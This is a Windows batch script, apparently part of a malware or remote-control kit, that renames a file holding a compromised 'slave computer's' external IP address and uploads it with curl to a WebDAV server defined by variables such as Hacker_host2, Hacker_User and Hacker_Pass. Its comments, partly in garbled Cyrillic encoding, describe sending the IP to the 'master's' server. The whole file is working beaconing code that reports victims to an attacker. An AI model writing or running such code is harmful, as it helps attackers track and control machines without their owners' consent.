@echo off
rem This Script Sends the external ip of slave computer to the host computer

set CURDATE=%DATE%
if "%TIME:~0,1%"==" "  GOTO CHECK
set CURTIME=%TIME%
GOTO NEXTOP
:CHECK
set CURTIME=0%TIME:~1,8%
:NEXTOP

set newname2=MyIP-%CURDATE:~8,2%%CURDATE:~3,2%%CURDATE:~0,2%_%CURTIME:~0,2%%CURTIME:~3,2%%CURTIME:~6,2%.txt
move /Y %PUB1%\Util\MyIp.txt %PUB1%\Util\%newname2%

rem Define the Variables:
rem Main Folder
set Mainfolder=webdav
rem Protocol Prefix
set pref=%Hacker_httppref%
rem HTTP Port
set port=%Hacker_httpport%

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%/
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Ћокальный каталог
set LocalFolderU=%PUB1%\Util
 
rem ѕереходим в каталог сервера

cd /d %LocalFolderU%
 

rem ќтправка внешнего IP адреса на сервер хоз€ина
curl --upload-file "%newname2%" -v --user %user%:%password% %host%
set CURDATE=
set CURRTIME=
set newname2=

